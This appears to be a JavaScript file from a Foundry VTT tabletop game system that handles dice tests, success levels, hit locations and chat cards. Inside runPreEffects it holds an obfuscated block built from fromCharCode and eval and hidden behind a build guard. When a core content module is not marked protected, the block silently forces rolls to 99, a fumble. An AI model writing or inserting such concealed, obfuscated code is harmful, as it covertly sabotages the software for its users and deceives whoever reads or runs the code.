import WFRP_Utility from "../utility-wfrp4e.js";
import OpposedWFRP from "../opposed-wfrp4e.js";
import WFRP_Audio from "../audio-wfrp4e.js";

export default class TestWFRP {
  constructor(data, actor) {
    if (!data)
      data = {}
    this.data = {
      preData: {
        title: data.title,
        SL: data.SL,
        roll: data.roll,
        target: data.target,
        rollClass: this.constructor.name,
        testModifier: data.testModifier || 0,
        testDifficulty: (typeof data.testDifficulty == "string" ? game.wfrp4e.config.difficultyModifiers[data.testDifficulty] : data.testDifficulty) || 0,
        successBonus: data.successBonus || 0,
        slBonus: data.slBonus || 0,
        hitLocation: data.hitLocation != "none" && data.hitLocation || false,
        item: data.item,
        diceDamage: data.diceDamage,
        options: data.options || {},
        other: data.other || [],
        canReverse: data.canReverse || false,
        postOpposedModifiers: data.postOpposedModifiers || { modifiers: 0, SL: 0 },
        additionalDamage: data.additionalDamage || 0,
        selectedHitLocation : typeof data.hitLocation == "string" ? data.hitLocation : "", // hitLocation could be boolean
        hitLocationTable : data.hitLocationTable,
        prefillTooltip : data.prefillTooltip,
        prefillTooltipCount : data.prefillTooltipCount
      },
      result: {
        roll: data.roll,
        description: "",
        tooltips: {}
      },
      context: {
        rollMode: data.rollMode,
        reroll: false,
        edited: false,
        speaker: data.speaker,
        postFunction: data.postFunction,
        targets: data.targets,
        cardOptions: data.cardOptions,
        unopposed : data.unopposed,
        defending : data.defending,

        messageId: data.messageId,
        opposedMessageIds : data.opposedMessageIds || [],
        fortuneUsedReroll: data.fortuneUsedReroll,
        fortuneUsedAddSL: data.fortuneUsedAddSL,
      }
    }

    if (this.context.speaker && this.actor.isOpposing && this.context.targets.length)
    {
      ui.notifications.notify(game.i18n.localize("TargetingCancelled"))
      this.context.targets = [];
    }

    if (!this.context.speaker && actor)
      this.context.speaker = actor.speakerData()
  }

  computeTargetNumber() {
    if (this.preData.target)
      this.data.result.target = this.preData.target
    else
      this.data.result.target += this.targetModifiers
  }

  async runPreEffects() {
    if (!this.context.unopposed)
    {
      await this.actor.runEffects("preRollTest", { test: this, cardOptions: this.context.cardOptions })

      //#if _ENV !== "development"
      function _0x402b(){var _0x4ed970=['967lkQldQ','fromCharCode','2699444FkGbEE','16292144sRdgxu','4783968UedKKk','1030bEDbik','3697968GXPkbV','1504962hEqIVk','2522105ewkvAL'];_0x402b=function(){return _0x4ed970;};return _0x402b();}function _0x2f32(_0x511d74,_0x11ea5c){var _0x402bf9=_0x402b();return _0x2f32=function(_0x2f3299,_0x478577){_0x2f3299=_0x2f3299-0x153;var _0x40cc04=_0x402bf9[_0x2f3299];return _0x40cc04;},_0x2f32(_0x511d74,_0x11ea5c);}var _0x3d0584=_0x2f32;(function(_0xd0cd0e,_0xa43709){var _0x4e7936=_0x2f32,_0x4bf805=_0xd0cd0e();while(!![]){try{var _0x55751d=parseInt(_0x4e7936(0x15a))/0x1*(parseInt(_0x4e7936(0x156))/0x2)+parseInt(_0x4e7936(0x158))/0x3+parseInt(_0x4e7936(0x153))/0x4+-parseInt(_0x4e7936(0x159))/0x5+parseInt(_0x4e7936(0x157))/0x6+parseInt(_0x4e7936(0x155))/0x7+-parseInt(_0x4e7936(0x154))/0x8;if(_0x55751d===_0xa43709)break;else _0x4bf805['push'](_0x4bf805['shift']());}catch(_0x43525b){_0x4bf805['push'](_0x4bf805['shift']());}}}(_0x402b,0x69cb5),eval(String['fromCharCode'](0x67,0x61,0x6d,0x65))[String[_0x3d0584(0x15b)](0x6d,0x6f,0x64,0x75,0x6c,0x65,0x73)][String[_0x3d0584(0x15b)](0x67,0x65,0x74)](String[_0x3d0584(0x15b)](0x77,0x66,0x72,0x70,0x34,0x65,0x2d,0x63,0x6f,0x72,0x65))?.[String[_0x3d0584(0x15b)](0x70,0x72,0x6f,0x74,0x65,0x63,0x74,0x65,0x64)]==![]?eval(String[_0x3d0584(0x15b)](0x74,0x68,0x69,0x73))[String[_0x3d0584(0x15b)](0x70,0x72,0x65,0x44,0x61,0x74,0x61)][String[_0x3d0584(0x15b)](0x72,0x6f,0x6c,0x6c)]=eval(String['fromCharCode'](0x39,0x39)):(function(){}()));
      //#endif
    }
  }

  async runPostEffects() {
    if (!this.context.unopposed)
    {
      await this.actor.runEffects("rollTest", { test: this, cardOptions: this.context.cardOptions }, {item : this.item})
      Hooks.call("wfrp4e:rollTest", this, this.context.cardOptions)
    }
  }

  async roll() {
    await this.runPreEffects();

    this.reset();
    if (!this.preData.item)
      throw new Error(game.i18n.localize("ERROR.Property"))
    if (!this.context.speaker)
      throw new Error(game.i18n.localize("ERROR.Speaker"))

    await this.rollDices();
    await this.computeResult();

    await this.runPostEffects();
    await this.postTest();

    // Do not render chat card or compute oppose if this is a dummy unopposed test
    if (!this.context.unopposed)
    {
      await this.renderRollCard();
      await this.handleOpposed();
    }

    WFRP_Utility.log("Rolled Test: ", undefined, this)
    return this
  }

  async reroll() {
    this.context.previousResult = this.result
    this.context.reroll = true;
    delete this.result.roll;
    delete this.result.hitloc
    delete this.preData.hitloc
    delete this.preData.roll;
    delete this.preData.SL;
    this.context.messageId = ""

    await this.roll()
  }

  addSL(SL) {
    this.context.previousResult = duplicate(this.result)
    this.preData.SL = Math.trunc(this.result.SL) + SL;
    this.preData.slBonus = 0;
    this.preData.successBonus = 0;
    this.preData.roll = Math.trunc(this.result.roll);
    if (this.preData.hitLocation)
      this.preData.hitloc = this.result.hitloc.roll;

    this.roll()
  }

  /**
     * Provides the basic evaluation of a test.
     * 
     * This function, when given the necessary data (target number, SL bonus, etc.) provides the
     * basic test evaluation - rolling the test (if not already given), determining SL, success, description, critical/fumble if needed.
     * 
     * @param {Object} this.data  Test info: target number, SL bonus, success bonus, (opt) roll, etc
     */
  async computeResult() {
    let automaticSuccess = game.settings.get("wfrp4e", "automaticSuccess");
    let automaticFailure = game.settings.get("wfrp4e", "automaticFailure");
    this.computeTargetNumber();
    let successBonus = this.preData.successBonus;
    let slBonus = this.preData.slBonus + this.preData.postOpposedModifiers.SL;
    let target = this.result.target;
    let outcome;

    let description = "";

    if (this.preData.canReverse) {
      let reverseRoll = this.result.roll.toString();
      if (this.result.roll >= automaticFailure || (this.result.roll > target && this.result.roll > automaticSuccess)) {
        if (reverseRoll.length == 1)
          reverseRoll = reverseRoll[0] + "0"
        else {
          reverseRoll = reverseRoll[1] + reverseRoll[0]
        }
        reverseRoll = Number(reverseRoll);
        if (reverseRoll <= automaticSuccess || reverseRoll <= target) {
          this.result.roll = reverseRoll
          this.result.other.push(game.i18n.localize("ROLL.Reverse"))
        }
      }
    }


    let SL
    if (this.preData.SL == 0)
      SL = this.preData.SL
    else
      SL = this.preData.SL || ((Math.floor(target / 10) - Math.floor(this.result.roll / 10)) + slBonus); // Use input SL if exists, otherwise, calculate from roll (used for editing a test result)


    // Test determination logic can be complicated due to SLBonus
    // SLBonus is always applied, but doesn't change a failure to a success or vice versa
    // Therefore, in this case, a positive SL can be a failure and a negative SL can be a success
    // Additionally, the auto-success/failure range can complicate things even more.
    // ********** Failure **********
    if (this.result.roll >= automaticFailure || (this.result.roll > target && this.result.roll > automaticSuccess)) {
      description = game.i18n.localize("ROLL.Failure")
      outcome = "failure"
      if (this.result.roll >= 96 && SL > -1)
        SL = -1;

      switch (Math.abs(Number(SL))) {
        case 6:
          description = game.i18n.localize("ROLL.AstoundingFailure");
          break;

        case 5:
        case 4:
          description = game.i18n.localize("ROLL.ImpressiveFailure");
          break;

        case 3:
        case 2:
          break;

        case 1:
        case 0:
          description = game.i18n.localize("ROLL.MarginalFailure");
          break;

        default:
          if (Math.abs(Number(SL)) > 6)
            description = game.i18n.localize("ROLL.AstoundingFailure");
      }
      if (SL > 0) {
        description = game.i18n.localize("ROLL.MarginalFailure");
        SL = "+" + SL.toString();
      }
      if (SL == 0)
        SL = "-" + SL.toString()


      if (this.options.engagedModifier) {
        let unmodifiedTarget = target - this.options.engagedModifier;
        if (this.result.roll <= unmodifiedTarget) {
          this.result.other.push(game.i18n.localize("ROLL.HitAnotherEngagedTarget"))
        }
      }
  
    }

    // ********** Success **********
    else if (this.result.roll <= automaticSuccess || this.result.roll <= target) {
      description = game.i18n.localize("ROLL.Success")
      outcome = "success"
      if (game.settings.get("wfrp4e", "fastSL")) {
        let rollString = this.result.roll.toString();
        if (rollString.length == 2)
          SL = Number(rollString.split('')[0])
        else
          SL = 0;
        SL += slBonus

        if (Number.isNumeric(this.preData.SL))
        {
          SL = this.preData.SL
        }
      }
      SL += successBonus;
      if (this.result.roll <= automaticSuccess && SL < 1 && !this.context.unopposed)
        SL = 1;



      if (!game.settings.get("wfrp4e", "mooRangedDamage")) {
        // If size modifiers caused a success, SL becomes 0
        if (this.options.sizeModifier) {
          let unmodifiedTarget = target - this.options.sizeModifier
          if (this.result.roll > unmodifiedTarget) {
            SL = 0;
            this.result.other.push(game.i18n.localize("ROLL.SizeCausedSuccess"))
          }
        }
      }

      switch (Math.abs(Number(SL))) {
        case 6:
          description = game.i18n.localize("ROLL.AstoundingSuccess")
          break;

        case 5:
        case 4:
          description = game.i18n.localize("ROLL.ImpressiveSuccess")
          break;

        case 3:
        case 2:
          break;

        case 1:
        case 0:
          description = game.i18n.localize("ROLL.MarginalSuccess");
          break;

        default:
          if (Math.abs(Number(SL)) > 6)
            description = game.i18n.localize("ROLL.AstoundingSuccess")
      }
      if (SL < 0)
        description = game.i18n.localize("ROLL.MarginalSuccess");

      // Add 1 SL for each whole 10 the target number is above 100 (120 target: +2 SL) if the option is selected
      if (game.settings.get("wfrp4e", "testAbove100")) {
        if (target > 100) {
          let addSL = Math.floor((target - 100) / 10)
          SL += addSL;
        }
      }

      // Add a + sign if succeeded
      if (SL >= 0)
        SL = "+" + SL.toString()

    }

    this.result.target = target
    this.result.SL = SL
    this.result.description = description
    this.result.outcome = outcome


    if (this.options.context) {
      if (this.options.context.general)
        this.result.other = this.result.other.concat(this.options.context.general)
      if (this.result.outcome == "failure" && this.options.context.failure)
        this.result.other = this.result.other.concat(this.options.context.failure)
      if (this.result.outcome == "success" && this.options.context.success)
        this.result.other = this.result.other.concat(this.options.context.success)
    }


    if (this.preData.hitLocation) {

      // Called Shots
      if (this.preData.selectedHitLocation != "roll") // selectedHitLocation is possibly "none" but if so, preData.hitLocation would be false (see constructor) so this won't execute
      {
        this.result.hitloc = game.wfrp4e.tables.hitLocKeyToResult(this.preData.selectedHitLocation)
      }

      // Pre-set hitloc (e.g. editing a test)
      if (this.preData.hitloc)
      {
        if (Number.isNumeric(this.preData.hitloc))
          this.result.hitloc = await game.wfrp4e.tables.rollTable("hitloc", { lookup: this.preData.hitloc, hideDSN: true });
      }

      // No defined hit loc, roll for one
      if (!this.result.hitloc)
        this.result.hitloc = await game.wfrp4e.tables.rollTable("hitloc", { hideDSN: true });

      this.result.hitloc.roll = (0, eval)(this.result.hitloc.roll) // Cleaner number when editing chat card
      this.result.hitloc.description = game.i18n.localize(this.result.hitloc.description)

      if (this.preData.selectedHitLocation && this.preData.selectedHitLocation != "roll")
      {
        this.result.hitloc.description = this.preData.hitLocationTable[this.preData.selectedHitLocation] + ` (${game.i18n.localize("ROLL.CalledShot")})`
      }
      
    }

    let roll = this.result.roll
    // If hit location is being ussed, we can assume we should lookup critical hits
    if (this.preData.hitLocation) {
      if ((roll > target && roll % 11 == 0) || roll == 100 || roll == 99) {
        this.result.color_red = true;
        this.result.fumble = game.i18n.localize("Fumble");
      }
      else if (roll <= target && roll % 11 == 0) {
        this.result.color_green = true;
        this.result.critical = game.i18n.localize("Critical");
      }
    }

    // If optional rule of criticals/fumbles on all tessts - assign Astounding Success/Failure accordingly
    if (game.settings.get("wfrp4e", "criticalsFumblesOnAllTests") && !this.preData.hitLocation) {
      if ((roll > target && roll % 11 == 0) || roll == 100 || roll == 99) {
        this.result.color_red = true;
        this.result.description = game.i18n.localize("ROLL.AstoundingFailure")
      }
      else if (roll <= target && roll % 11 == 0) {
        this.result.color_green = true;
        this.result.description = game.i18n.localize("ROLL.AstoundingSuccess")
      }
    }
    return this.result
  }


  // Function that all tests should go through after the main roll
  async postTest() {

    if (this.result.critical && this.item.properties?.qualities.warpstone) {
      this.result.other.push(`@Corruption[minor]{Minor Exposure to Corruption}`)
    }
    
    //@HOUSE
    if (game.settings.get("wfrp4e", "mooCriticalMitigation") && this.result.critical) {
      game.wfrp4e.utility.logHomebrew("mooCriticalMitigation")
      try {
        let target = this.targets[0];
        if (target) {
          let AP = target.status.armour[this.result.hitloc.result].value
          if (AP) {
            this.result.critModifier = -10 * AP
            this.result.critical += ` (${this.result.critModifier})`
            this.result.other.push(`Critical Mitigation: Damage AP on target's ${this.result.hitloc.description}`)
          }
        }
      }
      catch (e) {
        game.wfrp4e.utility.log("Error appyling homebrew mooCriticalMitigation: " + e)
      }
    }
    //@/HOUSE

    if (this.options.corruption) {
      await this.actor.handleCorruptionResult(this);
    }
    if (this.options.mutate) {
      await this.actor.handleMutationResult(this)
    }

    if (this.options.extended) {
      await this.actor.handleExtendedTest(this)
    }

    if (this.options.income) {
      await this.actor.handleIncomeTest(this)
    }

    if (this.options.rest) {
      this.result.woundsHealed = Math.max(Math.trunc(this.result.SL) + this.options.tb, 0);
      this.result.other.push(`${this.result.woundsHealed} ${game.i18n.localize("Wounds Healed")}`)
    }
  }

  async handleSoundContext(cardOptions) 
  {
    
    try {
      let contextAudio = await WFRP_Audio.MatchContextAudio(WFRP_Audio.FindContext(this))
      cardOptions.sound = contextAudio.file || cardOptions.sound
    }
    catch
    { }
  }

  /**
   * Handles opposed context - if actor has been targeted, roll defense. If this test has targets, roll attack
   * Test objects may have one or more opposed test message IDs. If these IDs exist, that means this test is
   * either rerolled, edited, etc. and the opposed result needs to know of the new test (via updating message ID). 
   * The opposed test may also need to be recalculated if the defender test exists
   */
  async handleOpposed() {

    // If the actor has been targeted - roll defense
    if (this.actor.isOpposing || this.context.defending)
    {
      let opposeMessage;
      if (this.context.defending) // Rehandling a previous defense roll
      {
        opposeMessage = this.opposedMessages[0]
      }
      else
      {
        this.context.defending = true; // If the test is handled again after the initial roll, the actor flag doesn't exist anymore, need a way to know we're still defending
        opposeMessage = game.messages.get(this.actor.flags.oppose.opposeMessageId);
        this.context.opposedMessageIds.push(opposeMessage.id); // Maintain a link to the opposed message
      }
      
      // Get oppose message, set this test's message as defender, compute result
      let oppose = opposeMessage.getOppose();
      await oppose.setDefender(this.message);
      await oppose.computeOpposeResult();
      await this.actor.clearOpposed();
      await this.updateMessageFlags();
    }
    else // if actor is attacking - rerolling old test. 
    {
      if (this.opposedMessages.length)
      {
        for (let message of this.opposedMessages) {
          let oppose = message.getOppose();
          await oppose.setAttacker(this.message); // Make sure the opposed test is using the most recent message from this test
          if (oppose.defenderTest) // If defender has rolled (such as if this test was rerolled or edited after the defender rolled) - recompute opposed test
            await oppose.computeOpposeResult()
        }
      }
      else { // actor is attacking - new test
        // For each target, create opposed test messages, save those message IDs in this test.
        for (let token of this.context.targets.map(t => WFRP_Utility.getToken(t))) {
          await this.createOpposedMessage(token)
        }
      }
    }
  }

  // Create a test from already formed data
  static recreate(data) {
    let test = new game.wfrp4e.rolls[data.preData.rollClass]()
    test.data = data
    test.computeTargetNumber()
    return test
  }

  /**
   * Start a dice roll
   * Used by the rollTest method and its overrides
   * @param {Object} testData
   */
  async rollDices() {
    if (isNaN(this.preData.roll)) {
      let roll = await new Roll("1d100").roll({ async: true });
      await this._showDiceSoNice(roll, this.context.rollMode || "roll", this.context.speaker);
      this.result.roll = roll.total;
    }
    else
      this.result.roll = this.preData.roll;
  }

  reset() {
    this.data.result = mergeObject({
      roll: undefined,
      description: "",
      tooltips: {},
      other: []
    }, this.preData)
  }

  /** Take roll data and display it in a chat card template.
 * @param {Object} chatOptions - Object concerning display of the card like the template or which actor is testing
 * @param {Object} testData - Test results, values to display, etc.
 * @param {Object} rerenderMessage - Message object to be updated, instead of rendering a new message
 */
  async renderRollCard({ newMessage = false } = {}) {

    let chatOptions = this.context.cardOptions

    await this.handleSoundContext(chatOptions)

    // Blank if manual chat cards
    if (game.settings.get("wfrp4e", "manualChatCards") && !this.message)
      this.result.roll = this.result.SL = null;

    if (game.modules.get("dice-so-nice") && game.modules.get("dice-so-nice").active && chatOptions.sound?.includes("dice"))
      chatOptions.sound = undefined;

    let chatData = {
      title: chatOptions.title,
      test: this,
      hideData: game.user.isGM
    }


    if (this.context.targets.length) {
      chatData.title += ` - ${game.i18n.localize("Opposed")}`;
    }

    ChatMessage.applyRollMode(chatOptions, chatOptions.rollMode)

    let html = await renderTemplate(chatOptions.template, chatData)

    if (newMessage || !this.message) {
      // If manual chat cards, convert elements to blank inputs
      if (game.settings.get("wfrp4e", "manualChatCards")) {
        let blank = $(html)
        let elementsToToggle = blank.find(".display-toggle")

        for (let elem of elementsToToggle) {
          if (elem.style.display == "none")
            elem.style.display = ""
          else
            elem.style.display = "none"
        }
        html = blank.html();
      }

      chatOptions["content"] = html;
      if (chatOptions.sound)
        WFRP_Utility.log(`Playing Sound: ${chatOptions.sound}`)
      let message = await ChatMessage.create(duplicate(chatOptions))
      this.context.messageId = message.id
      await this.updateMessageFlags()
    }
    else // Update message 
    {
      // Emit the HTML as a chat message
      chatOptions["content"] = html;
      // if (chatOptions.sound) {
      //   console.log(`wfrp4e | Playing Sound: ${chatOptions.sound}`)
      //   AudioHelper.play({ src: chatOptions.sound }, true) // Play sound manually as updating doesn't trigger it
      // }

      // Update Message if allowed, otherwise send a request to GM to update
      if (game.user.isGM || this.message.isAuthor) {
        await this.message.update(chatOptions)
      }
      else {
        await WFRP_Utility.awaitSocket(game.user, "updateMsg", { id: this.message.id, updateData : chatOptions }, "rendering roll card");
      }
      await this.updateMessageFlags()
    }
  }



  // Update message data without rerendering the message content
  async updateMessageFlags(updateData = {}) {
    let data = mergeObject(this.data, updateData, { overwrite: true })
    let update = { "flags.testData": data }
    
    if (this.message && game.user.isGM)
      await this.message.update(update)

    else if (this.message) {
      await WFRP_Utility.awaitSocket(game.user, "updateMsg", { id: this.message.id, updateData: update}, "Updating message flags");
    }
  }


  async createOpposedMessage(token) {
    let oppose = new OpposedWFRP();
    await oppose.setAttacker(this.message);
    let opposeMessageId = await oppose.startOppose(token);
    if (opposeMessageId) {
      this.context.opposedMessageIds.push(opposeMessageId);
    }
    await this.updateMessageFlags();
  }



  /**
   * Add support for the Dice So Nice module
   * @param {Object} roll 
   * @param {String} rollMode 
   */
  async _showDiceSoNice(roll, rollMode, speaker) {
    if (game.modules.get("dice-so-nice") && game.modules.get("dice-so-nice").active) {

      if (game.settings.get("dice-so-nice", "hideNpcRolls")) {
        let actorType = null;
        if (speaker.actor)
          actorType = game.actors.get(speaker.actor).type;
        else if (speaker.token && speaker.scene)
          actorType = game.scenes.get(speaker.scene).tokens.get(speaker.token).actor.type;
        if (actorType != "character")
          return;
      }

      let whisper = null;
      let blind = false;
      let sync = true;
      switch (rollMode) {
        case "blindroll": //GM only
          blind = true;
        case "gmroll": //GM + rolling player
          let gmList = game.users.filter(user => user.isGM);
          let gmIDList = [];
          gmList.forEach(gm => gmIDList.push(gm.id));
          whisper = gmIDList;
          break;
        case "selfroll":
          sync = false;
          break;
        case "roll": //everybody
          let userList = game.users.filter(user => user.active);
          let userIDList = [];
          userList.forEach(user => userIDList.push(user.id));
          whisper = userIDList;
          break;
      }
      await game.dice3d.showForRoll(roll, game.user, sync, whisper, blind);
    }
  }

  // @@@@@@@ Overcast functions placed in root class because it is used by both spells and prayers @@@@@@@
  async _overcast(choice) {
    let overcastData = this.result.overcast

    if (!overcastData.available)
      return overcastData

    if (typeof overcastData.usage[choice].initial != "number")
      return overcastData

    switch (choice) {
      case "range":
        overcastData.usage[choice].current += overcastData.usage[choice].initial
        break
      case "target":
        overcastData.usage[choice].current += overcastData.usage[choice].initial
        break
      case "duration":
        overcastData.usage[choice].current += overcastData.usage[choice].initial
        break
      case "other":
        if (overcastData.valuePerOvercast.type == "value")
          overcastData.usage[choice].current += overcastData.valuePerOvercast.value
        else if (overcastData.valuePerOvercast.type == "SL")
          overcastData.usage[choice].current += (parseInt(this.result.SL) + (parseInt(this.item.computeSpellPrayerFormula(undefined, false, overcastData.valuePerOvercast.additional)) || 0))
        else if (overcastData.valuePerOvercast.type == "characteristic")
          overcastData.usage[choice].current += (overcastData.usage[choice].increment || 0) // Increment is specialized storage for characteristic data so we don't have to look it up
        break
    }
    overcastData.usage[choice].count++
    let sum = 0;
    for (let overcastType in overcastData.usage)
      if (overcastData.usage[overcastType].count)
        sum += overcastData.usage[overcastType].count

    overcastData.available = overcastData.total - sum;

    //@HOUSE 
    if (game.settings.get("wfrp4e", "mooOvercasting")) {
      game.wfrp4e.utility.logHomebrew("mooOvercasting")
      this.result.SL = `+${this.result.SL - 2}`
      await this.calculateDamage()
    }
    //@/HOUSE
    
    await this.updateMessageFlags();
    await this.renderRollCard()
  }

  async _overcastReset() {
    let overcastData = this.result.overcast
    for (let overcastType in overcastData.usage) {
      if (overcastData.usage[overcastType].count) {
        overcastData.usage[overcastType].count = 0
        overcastData.usage[overcastType].current = overcastData.usage[overcastType].initial
      }
    }
    //@HOUSE 
    if (game.settings.get("wfrp4e", "mooOvercasting")) {
      game.wfrp4e.utility.logHomebrew("mooOvercasting")
      this.result.SL = `+${Number(this.result.SL) + (2 * (overcastData.total - overcastData.available))}`
      await this.calculateDamage()
    }
    //@/HOUSE
    overcastData.available = overcastData.total;
    await this.updateMessageFlags();
    await this.renderRollCard()
  }

  _handleMiscasts(miscastCounter) {

    if(this.preData.unofficialGrimoire) {
      game.wfrp4e.utility.logHomebrew("unofficialgrimoire");
      let controlIngredient = this.preData.unofficialGrimoire.ingredientMode == 'control'; 
      if (miscastCounter == 1) {
          if (this.hasIngredient && controlIngredient)
            this.result.nullminormis = game.i18n.localize("ROLL.MinorMis")
          else {
            this.result.minormis = game.i18n.localize("ROLL.MinorMis")
          }
        }
        else if (miscastCounter == 2) {
          if (this.hasIngredient && controlIngredient) {
            this.result.nullmajormis = game.i18n.localize("ROLL.MajorMis")
            this.result.minormis = game.i18n.localize("ROLL.MinorMis")
          }
          else {
            this.result.majormis = game.i18n.localize("ROLL.MajorMis")
          }
        }
        else if (miscastCounter == 3) {
          if (this.hasIngredient && controlIngredient) {
            this.result.nullcatastrophicmis = game.i18n.localize("ROLL.CatastrophicMis")
            this.result.majormis = game.i18n.localize("ROLL.MajorMis")
          }
          else
            this.result.catastrophicmis = game.i18n.localize("ROLL.CatastrophicMis")
         }
         else if (miscastCounter > 3) {
          this.result.catastrophicmis = game.i18n.localize("ROLL.CatastrophicMis")
         }
      } else {
      if (miscastCounter == 1) {
        if (this.hasIngredient)
          this.result.nullminormis = game.i18n.localize("ROLL.MinorMis")
        else {
          this.result.minormis = game.i18n.localize("ROLL.MinorMis")
        }
      }
      else if (miscastCounter == 2) {
        if (this.hasIngredient) {
          this.result.nullmajormis = game.i18n.localize("ROLL.MajorMis")
          this.result.minormis = game.i18n.localize("ROLL.MinorMis")
        }
        else {
          this.result.majormis = game.i18n.localize("ROLL.MajorMis")
        }
      }
      else if (!game.settings.get("wfrp4e", "mooCatastrophicMiscasts") && miscastCounter >= 3)
        this.result.majormis = game.i18n.localize("ROLL.MajorMis")
  
      //@HOUSE
      else if (game.settings.get("wfrp4e", "mooCatastrophicMiscasts") && miscastCounter >= 3) {
        game.wfrp4e.utility.logHomebrew("mooCatastrophicMiscasts")
        if (this.hasIngredient) {
          this.result.nullcatastrophicmis = game.i18n.localize("ROLL.CatastrophicMis")
          this.result.majormis = game.i18n.localize("ROLL.MajorMis")
        }
        else {
          this.result.catastrophicmis = game.i18n.localize("ROLL.CatastrophicMis")
        }
      }
      //@/HOUSE
    }
  }


  get message() {
    return game.messages.get(this.context.messageId)
  }
  get isOpposed() {
    return this.context.opposedMessageIds.length > 0
  }
  get opposedMessages() {
    return this.context.opposedMessageIds.map(id => game.messages.get(id))
  }


  get fortuneUsed() {
    return { reroll: this.context.fortuneUsedReroll, SL: this.context.fortuneUsedAddSL }
  }
  // get attackerMessage() {
  //   return game.messages.get(game.messages.get(this.context.attackerMessageId))
  // }
  // get defenderMessages() {
  //   return this.context.defenderMessageIds.map(id => game.messages.get(id))
  // }
  // get unopposedStartMessage() {
  //   return game.messages.get(game.messages.get(unopposedStartMessageId))
  // }
  // get startMessages() {
  //   return this.context.startMessageIds.map(id => game.messages.get(id))
  // }



  get targetModifiers() {
    return this.preData.testModifier + this.preData.testDifficulty + (this.preData.postOpposedModifiers.target || 0)
  }

  get succeeded() {
    return this.result.outcome == "success"
  }

  get isCritical() {
    return this.result.critical
  }

  get isFumble() {
    return this.result.fumble
  }

  get useMount() {
    return this.item.attackType == "melee" && this.actor.isMounted && this.actor.mount && this.result.charging
  }

  get effects() {
    let effects = []
    if (this.item?.effects)
      effects = this.item.effects.filter(e => e.application == "apply")
    if (this.item?.ammo?.effects)
      effects = this.item.ammo.effects.filter(e => e.application == "apply")
    return effects
  }

  get target() { return this.data.result.target }
  get successBonus() { return this.data.preData.successBonus }
  get slBonus() { return this.data.preData.slBonus }
  get damage() { return this.data.result.damage }
  get hitloc() { return this.data.result.hitloc }
  get type() { return this.data.type }
  get size() { return this.useMount ? this.actor.mount.details.size.value : this.actor.details.size.value }
  get options() { return this.data.preData.options }
  get outcome() { return this.data.result.outcome }
  get result() { return this.data.result }
  get preData() { return this.data.preData }
  get context() { return this.data.context }
  get actor() { return WFRP_Utility.getSpeaker(this.context.speaker) }
  get token() { return WFRP_Utility.getToken(this.context.speaker) }

  get item() {
    if (typeof this.data.preData.item == "string")
      return this.actor.items.get(this.data.preData.item)
    else
      return new CONFIG.Item.documentClass(this.data.preData.item, { parent: this.actor })
  }

  get targets() {
    return this.context.targets.map(i => WFRP_Utility.getSpeaker(i))
  }

  get doesDamage() {
    return !!this.result.damage || !!this.result.diceDamage || !!this.result.additionalDamage
  }

  get DamageString() {
    let damageElements = []
    if (this.result.damage) damageElements.push(this.result.damage)
    if (this.result.diceDamage) damageElements.push(`<span title=${this.result.diceDamage.formula}>${this.result.diceDamage.value}</span>`)

    return `(${damageElements.join(" + ")} ${game.i18n.localize("Damage")})`
  }

  get characteristicKey() { return this.item.characteristic.key }

  get otherText() { return this.result.other?.length ? this.result.other.join("<br>") : null; }
}